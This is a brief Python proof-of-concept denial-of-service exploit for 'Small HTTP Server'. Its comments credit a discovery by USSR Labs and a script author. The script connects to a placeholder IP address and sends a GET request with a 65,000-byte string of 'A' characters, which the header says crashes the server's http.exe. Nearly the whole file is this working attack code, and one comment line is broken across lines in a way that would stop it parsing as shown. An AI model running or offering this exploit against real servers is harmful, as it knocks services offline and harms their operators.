                                                                      
#!/usr/bin/python                                                     
#                                                                     
# Small HTTP Server DoS Proof of Concept Code.                        
# Vulnerability Discovered by USSR Labs(http://www.ussrback.com)      
# Simple Script by Prizm(Prizm@Resentment.org)                        
#                                                                     
# By connecting to port 80(http) on a system running Small HTTP Server
and issuing a GET                                                     
# command followed by 65000 bytes, the service will crash.            
#                                                                     
# This *simple* little script will cause http.exe to crash.           
                                                                      
import httplib                                                        
                                                                      
h = httplib.HTTP('xxx.xxx.xxx.xxx') #replace x's with ip              
h.putrequest('GET', 'A' * 65000)                                      
                                                                      
#end                                                                  
                                                                      
                                                                      
